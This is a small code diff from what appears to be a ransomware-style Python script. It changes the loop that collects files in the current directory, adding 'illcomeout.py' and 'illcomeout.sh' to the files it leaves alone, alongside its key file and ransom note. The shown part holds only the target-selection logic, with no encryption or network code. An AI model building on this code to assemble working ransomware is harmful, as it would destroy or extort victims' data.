@@ -14,7 +14,7 @@ files = []
 
 
 for file in os.listdir():
-    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt":
+    if file == "monsterwith23faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "illcomeout.py" or file == "illcomeout.sh":
         continue
     if os.path.isfile(file):
         files.append(file)
